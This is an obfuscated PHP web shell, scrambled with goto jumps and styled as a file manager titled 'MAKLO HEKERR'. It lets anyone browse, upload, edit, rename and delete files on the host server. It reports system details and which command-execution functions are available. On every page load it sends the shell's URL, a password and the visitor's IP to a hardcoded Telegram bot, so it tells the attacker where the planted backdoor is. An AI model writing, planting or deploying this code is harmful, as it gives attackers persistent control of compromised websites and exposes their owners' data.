<?php
 goto CELXN; My4wg: ini_set("post_max_size", "30M"); goto sfS58; kFivH: ?></h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file_upload" required>
    <input type="submit" value="Upload">
</form><br>
<form method="post">
    <input type="text" name="new_file" placeholder="New file" required>
    <input type="submit" value="Create File">
</form><br>
<form method="post">
    <input type="text" name="new_folder" placeholder="New folder" required>
    <input type="submit" value="Create Folder">
</form>
</div>

<div class="glass">
<h3>Terminal Status</h3>
<table>
<tr><th>Function</th><th>Status</th></tr>
<?php  goto OUKpp; sfS58: ini_set("max_execution_time", 300); goto xeTHv; Z0p1R: foreach ($sc_8q as $uxcT3) { goto kNOTK; hMyq2: echo "<form method='post' style='display:inline'>\n            <input type='hidden' name='rename_old' value='{$FT4K7}'>\n            <input type='text' name='rename_new' placeholder='Rename'>\n            <input type='submit' value='OK'>\n          </form>"; goto gz4e8; Li3Vm: if (is_file($FT4K7)) { echo "<a href='?edit=" . urlencode($FT4K7) . "'>Edit</a> | "; } goto JubcV; gB0ND: echo "<td>" . (is_file($FT4K7) ? filesize($FT4K7) . " bytes" : "-") . "</td>"; goto vfa9F; gPJBM: echo "<tr>"; goto xQIfR; nUtPN: $FT4K7 = $wRNlE . "/" . $uxcT3; goto gPJBM; gz4e8: echo "</td></tr>"; goto BROn6; kNOTK: if ($uxcT3 == "." || $uxcT3 == "..") { continue; } goto nUtPN; JubcV: echo "<a href='?delete=" . urlencode($FT4K7) . "' onclick='return confirm(\"Delete {$uxcT3}?\")'>Delete</a> | "; goto hMyq2; vfa9F: echo "<td>"; goto Li3Vm; xQIfR: echo "<td>" . (is_dir($FT4K7) ? "<a href='?path=" . urlencode($FT4K7) . "'><b>[DIR]</b> {$uxcT3}</a>" : $uxcT3) . "</td>"; goto gB0ND; BROn6: } goto yTwGu; yjDNE: $sc_8q = scandir($wRNlE); goto sKOha; xeTHv: ini_set("max_input_time", 300); goto w9fmZ; Hd6ET: if ($_POST["rename_old"] ?? false && $_POST["rename_new"] ?? false) { goto cSOpE; cSOpE: rename($_POST["rename_old"], $_POST["rename_new"]); goto fC1Yx; fC1Yx: header("Location: ?path=" . urlencode($wRNlE)); goto WU_w5; WU_w5: exit; goto gHSEL; gHSEL: } goto uYELm; GsHO2: ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Orbitron:wght@400;600&family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
    body{
        font-family:'Poppins',sans-serif;
        background:url('https://b.top4top.io/p_36289rhe30.jpg') center/cover no-repeat fixed;
        color:#e3e8f0;margin:0;padding:20px;
        backdrop-filter: blur(3px);
    }
    h1.jx-title{
        font-family:'Press Start 2P','Orbitron',sans-serif;
        text-align:center;
        letter-spacing:2px;
        margin:15px;
        font-size:32px;
        color:#00eaff;
        text-shadow:
            3px 3px 0 #000,
            5px 5px 12px #000,
            0 0 12px #00ffff,
            0 0 20px #0099ff;
    }
    .glass{
        background:rgba(8,14,30,0.72);
        border:1px solid rgba(0,80,255,0.3);
        box-shadow:0 0 10px rgba(0,80,255,0.35);
        padding:15px;margin-bottom:20px;
        border-radius:10px;
    }
    input[type=text],input[type=file]{
        padding:8px;background:rgba(0,11,30,0.8);
        border:1px solid #004d99;border-radius:6px;
        color:#9ec6ff;width:260px;
    }
    input[type=submit]{
        padding:8px 18px;background:#003374;border:none;
        border-radius:6px;cursor:pointer;color:#fff;font-weight:bold;
    }
    input[type=submit]:hover{background:#004aa8}
    table{
        width:100%;border-collapse:collapse;
        background:rgba(8,14,30,0.70);
        border:1px solid rgba(0,80,255,0.3);
    }
    th,td{padding:10px;border-bottom:1px solid rgba(0,80,255,0.25);color:#d7e1f3}
    a{color:#0095ff;text-decoration:none}
    a:hover{text-shadow:0 0 6px #007eff}
    .status-on{color:#4dff88;font-weight:bold}
    .status-off{color:#ff4a4a;font-weight:bold}
</style>
</head>
<body>

<h1 class="jx-title"><\> MAKLO HEKERR <\></h1>

<div class="glass">
<h3>Path: <?php  goto Qld2P; FuEmJ: $T52my = ["exec", "shell_exec", "passthru", "system", "popen", "proc_open"]; goto GsHO2; jnj_n: $wRNlE = isset($_GET["path"]) ? $_GET["path"] : getcwd(); goto UH_FI; DCpsX: ?>
</div>

<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>

<?php  goto yjDNE; WbQc7: ini_set("upload_max_filesize", "30M"); goto My4wg; PCWqH: $V4siO = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; goto EBFxb; Bv86I: echo php_uname(); goto DCpsX; UH_FI: $wRNlE = realpath($wRNlE); goto FhHR2; weEcH: gY_2v($h_QP4, $yzIM1, $PayZY); goto jnj_n; Mv42z: if (isset($_GET["edit"])) { goto Quxma; NT93W: ?></textarea><br>
<input type="submit" value="Save">
</form>
</div>
</body>
</html>
<?php  goto mauTg; Quxma: $Wj5uW = $_GET["edit"]; goto YX8g8; xYeWO: $h71gk = htmlspecialchars(file_get_contents($Wj5uW)); goto VQ6tn; VQ6tn: ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Orbitron:wght@400;600&family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
    body{
        font-family:'Poppins',sans-serif;
        background:url('https://b.top4top.io/p_36289rhe30.jpg') center/cover no-repeat fixed;
        color:#e3e8f0;margin:0;padding:20px;
        backdrop-filter: blur(4px);
    }
    .glass{
        background:rgba(8,14,30,0.72);
        border:1px solid rgba(0,80,255,0.3);
        box-shadow:0 0 10px rgba(0,80,255,0.4);
        padding:15px;border-radius:10px;
    }
    textarea{
        width:100%;height:70vh;background:#050914;
        border:1px solid #0052a5;color:#9ec6ff;
        padding:10px;border-radius:8px;
        font-family:monospace;
    }
    input[type=submit]{
        margin-top:10px;padding:10px 20px;
        background:#003374;border:none;color:#fff;
        border-radius:6px;cursor:pointer;
        font-weight:bold;
    }
    input[type=submit]:hover{background:#004aa8}
    h1.jx-title{
        font-family:'Press Start 2P','Orbitron',sans-serif;
        text-align:center;
        letter-spacing:2px;
        margin:15px;
        font-size:28px;
        color:#00eaff;
        text-shadow:
            3px 3px 0 #000,
            5px 5px 12px #000,
            0 0 12px #00ffff,
            0 0 20px #0099ff;
    }
</style>
</head>
<body>
<div class="glass">
<h1 class="jx-title"><\> MAKLO HEKER <\></h1>
<h2 style="font-family:Orbitron;color:#0095ff;text-shadow:0 0 6px #0077ff">Edit File: <?php  goto mCHTy; mCHTy: echo htmlspecialchars($Wj5uW); goto YKQAz; mauTg: exit; goto owNbV; jlDg9: echo $h71gk; goto NT93W; YX8g8: if (isset($_POST["new_content"])) { goto cNFia; Ay0mp: header("Location: ?path=" . urlencode($wRNlE)); goto p9Daj; cNFia: file_put_contents($Wj5uW, $_POST["new_content"]); goto Ay0mp; p9Daj: exit; goto bIJPn; bIJPn: } goto xYeWO; YKQAz: ?></h2>
<form method="post">
<textarea name="new_content"><?php  goto jlDg9; owNbV: } goto Or62t; EBFxb: $PayZY = "__MINI TOP99___ \n\n Shell nya =\n {$V4siO} \n\n Password =\n {$hnZT4} \n\n IP  :\n [ " . $_SERVER["REMOTE_ADDR"] . " ]"; goto weEcH; G66_0: if ($_POST["new_file"] ?? false) { goto DgERw; XlKnk: header("Location: ?path=" . urlencode($wRNlE)); goto yTGQ4; DgERw: $qDQHR = $wRNlE . "/" . $_POST["new_file"]; goto jtBUh; yTGQ4: exit; goto v_jJx; jtBUh: if (!file_exists($qDQHR)) { file_put_contents($qDQHR, ""); } goto XlKnk; v_jJx: } goto Bh46i; CqKoe: $yzIM1 = "5070938778"; goto PCWqH; CELXN: ?>

<?php  goto WbQc7; Qld2P: echo htmlspecialchars($wRNlE); goto kFivH; OUKpp: foreach ($T52my as $uZzj6) { $LceUN = Z_hS6($uZzj6) ? "<span class='status-on'>ON</span>" : "<span class='status-off'>OFF</span>"; echo "<tr><td>{$uZzj6}</td><td>{$LceUN}</td></tr>"; } goto YFyWm; sKOha: if ($wRNlE != "/") { echo "<tr><td colspan=3><a href='?path=" . urlencode(dirname($wRNlE)) . "'>Back</a></td></tr>"; } goto Z0p1R; Or62t: if (isset($_FILES["file_upload"])) { goto qfivr; gOLuR: $KGXzF = $wRNlE . "/" . $G6mif; goto vmyyx; vmyyx: if (is_uploaded_file($oiCLV) && filesize($oiCLV) > 0) { move_uploaded_file($oiCLV, $KGXzF); } else { file_put_contents($KGXzF . ".failed", "UPLOAD FAILED / 0KB (LITESPEED PROTECTION)"); } goto hom1X; zQGtp: exit; goto d8dOQ; hom1X: header("Location: ?path=" . urlencode($wRNlE)); goto zQGtp; qfivr: $oiCLV = $_FILES["file_upload"]["tmp_name"]; goto tVPZF; tVPZF: $G6mif = $_FILES["file_upload"]["name"]; goto gOLuR; d8dOQ: } goto G66_0; w9fmZ: $h_QP4 = "8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc"; goto CqKoe; FhHR2: chdir($wRNlE); goto kRxOA; Bh46i: if ($_POST["new_folder"] ?? false) { goto bw_dG; U7Ycx: exit; goto KRBpT; bw_dG: $MAQNQ = $wRNlE . "/" . $_POST["new_folder"]; goto H9xYZ; Ydq8O: header("Location: ?path=" . urlencode($wRNlE)); goto U7Ycx; H9xYZ: if (!file_exists($MAQNQ)) { mkdir($MAQNQ); } goto Ydq8O; KRBpT: } goto i3WRC; YFyWm: ?>
</table><br>
<b>Server Info:</b><br><?php  goto Bv86I; uYELm: function GY_2v($h_QP4, $yzIM1, $CHPAS) { goto fXNan; ZxyC_: $JzG_u = file_get_contents($LAxOp, false, $OeShu); goto Lsi5a; Rehvl: $OeShu = stream_context_create($VRYit); goto ZxyC_; Mc2Ny: $RTHO_ = ["chat_id" => $yzIM1, "text" => $CHPAS]; goto fnNfA; fnNfA: $VRYit = ["http" => ["method" => "POST", "header" => "Content-Type: application/x-www-form-urlencoded", "content" => http_build_query($RTHO_)]]; goto Rehvl; fXNan: $LAxOp = "https://api.telegram.org/bot{$h_QP4}/sendMessage"; goto Mc2Ny; Lsi5a: } goto Mv42z; i3WRC: function z_hs6($PYKpJ) { $coRhq = explode(",", ini_get("disable_functions")); return !in_array($PYKpJ, $coRhq); } goto FuEmJ; kRxOA: if (isset($_GET["delete"])) { goto ju2R5; k6uq8: header("Location: ?path=" . urlencode(dirname($KGXzF))); goto YT2NB; YT2NB: exit; goto ovpGz; ju2R5: $KGXzF = $_GET["delete"]; goto r2yGn; r2yGn: if (is_file($KGXzF)) { unlink($KGXzF); } elseif (is_dir($KGXzF)) { rmdir($KGXzF); } goto k6uq8; ovpGz: } goto Hd6ET; yTwGu: ?>
</table>

</body>
</html>
